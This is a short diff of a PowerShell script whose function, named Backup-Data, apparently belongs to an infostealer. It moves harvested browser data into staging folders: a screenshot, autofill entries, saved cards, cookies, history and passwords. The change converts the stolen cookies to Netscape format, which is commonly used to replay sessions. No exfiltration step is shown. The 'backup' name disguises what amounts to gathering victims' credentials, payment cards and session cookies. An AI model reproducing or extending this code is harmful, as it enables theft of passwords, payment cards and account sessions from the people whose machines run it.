@@ -848,7 +848,7 @@ function Backup-Data {
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
     Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\cookies.json" -Destination "$browser_data" -Force
+    Move-Item -Path "$main_temp\cookies_netscape.txt" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force
